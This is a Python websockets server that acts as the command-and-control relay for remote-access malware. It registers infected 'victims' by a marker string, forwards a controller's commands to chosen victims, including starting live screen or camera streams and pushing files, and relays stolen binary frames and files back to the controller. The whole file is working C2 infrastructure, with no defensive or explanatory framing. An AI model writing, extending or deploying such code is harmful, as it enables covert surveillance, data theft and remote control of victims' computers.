import sys
import os
import asyncio
import websockets
import uuid

victims = {}
rdid = None
controller = None
background_controller = None

async def handler(websocket):
    global controller, rdid, background_controller
    try:
        first_msg = await websocket.recv()
        print(first_msg)
    except websockets.ConnectionClosed:
        return

    # Handle BACKGROUND CONTROLLER
    if first_msg.find("ROLE:BACKGROUND") != -1:
        background_controller = websocket
        try:
            for vid in victims.keys():
                await background_controller.send(f"EXISTING_VICTIM:{vid}")
            await websocket.wait_closed()
        except Exception as e:
            print(f"Background controller error: {e}")
        finally:
            if background_controller == websocket:
                background_controller = None
        return

    # Handle VICTIM
    elif first_msg.find(":VICTIM-777777") != -1:
        victim_id = first_msg[:first_msg.find(":VICTIM-777777")]
        victims[victim_id] = websocket
        rdid = victim_id

        # Notify main controller
        if controller and not controller.closed:
            try:
                await controller.send(f"NEW_VICTIM:{victim_id}")
            except websockets.ConnectionClosed:
                controller = None

        # Notify background controller
        if background_controller and not background_controller.closed:
            try:
                await background_controller.send(f"NEW_VICTIM:{victim_id}")
            except websockets.ConnectionClosed:
                background_controller = None

        try:
            async for message in websocket:
                print(f"Victim {victim_id} msg: {message}")

                if isinstance(message, bytes):
                    # Forward ALL binary data (frames, files) to the controller
                    if controller and not controller.closed:
                        try:
                            await controller.send(message)
                        except websockets.ConnectionClosed:
                            controller = None

                elif isinstance(message, str):
                    # Forward ALL string messages to the controller. 
                    # The controller's handleControllerMessage already strips the "ID:" prefix.
                    if controller and not controller.closed:
                        try:
                            await controller.send(message)
                        except websockets.ConnectionClosed:
                            controller = None

                    # Update rdid so the server knows which victim is expecting a file
                    if "READY_FOR_FILE" in message:
                        rdid = victim_id

        except Exception as e:
            print(f"Victim {victim_id} error: {e}")
        finally:
            if victim_id in victims:
                del victims[victim_id]
                # Notify main controller
                if controller and not controller.closed:
                    try:
                        await controller.send(f"VICTIM_LOST:{victim_id}")
                    except websockets.ConnectionClosed:
                        controller = None
                # Notify background controller
                if background_controller and not background_controller.closed:
                    try:
                        await background_controller.send(f"VICTIM_LOST:{victim_id}")
                    except websockets.ConnectionClosed:
                        background_controller = None
        return

    # Handle MAIN CONTROLLER
    elif first_msg == "ROLE:CONTROLLER":
        controller = websocket
        try:
            for vid in victims.keys():
                await controller.send(f"EXISTING_VICTIM:{vid}")
            async for message in websocket:
                print(f"Controller msg: {message}")

                # Handle live stream commands (now supports "ID:START_LIVE_STREAM")
                if "START_LIVE_STREAM" in message or "STOP_LIVE_STREAM" in message:
                    if ":" in message:
                        parts = message.split(":", 1)
                        target_id = parts[0]
                        cmd = parts[1]
                        if target_id in victims:
                            try:
                                await victims[target_id].send(cmd)
                            except websockets.ConnectionClosed:
                                del victims[target_id]
                    else:
                        # Fallback: if no ID is provided, send to the first available victim
                        if victims:
                            victim_ws = next(iter(victims.values()))
                            if not victim_ws.closed:
                                try:
                                    await victim_ws.send(message)
                                except websockets.ConnectionClosed:
                                    lost_id = [k for k, v in victims.items() if v == victim_ws]
                                    if lost_id:
                                        del victims[lost_id[0]]

                elif isinstance(message, str) and ":" in message:
                    parts = message.split(":", 2)
                    if len(parts) >= 2:
                        target_id = parts[0]
                        command = ":".join(parts[1:])
                        if target_id in victims:
                            victim_ws = victims[target_id]
                            if not victim_ws.closed:
                                try:
                                    await victim_ws.send(command)
                                except websockets.ConnectionClosed:
                                    del victims[target_id]
                                    if controller and not controller.closed:
                                        try:
                                            await controller.send(f"VICTIM_LOST:{target_id}")
                                        except:
                                            pass
                        else:
                            if controller and not controller.closed:
                                try:
                                    await controller.send(f"ERROR: No victim {target_id}")
                                except:
                                    pass

                elif message == "BINARY_END_FILE":
                    if rdid in victims:
                        try:
                            await victims[rdid].send(message)
                        except websockets.ConnectionClosed:
                            del victims[rdid]
                            rdid = None

                else:
                    if rdid in victims:
                        try:
                            await victims[rdid].send(message)
                        except websockets.ConnectionClosed:
                            del victims[rdid]
                            rdid = None

        except Exception as e:
            print(f"Controller error: {e}")
        finally:
            if controller == websocket:
                controller = None
        return

    # Unknown role
    else:
        print("Unknown client role")
        return


async def main():
    server = await websockets.serve(handler, "0.0.0.0", 8765)
    print("Server running on ws://0.0.0.0:8765")
    await asyncio.Future()  # Run forever


if __name__ == "__main__":
    asyncio.run(main())
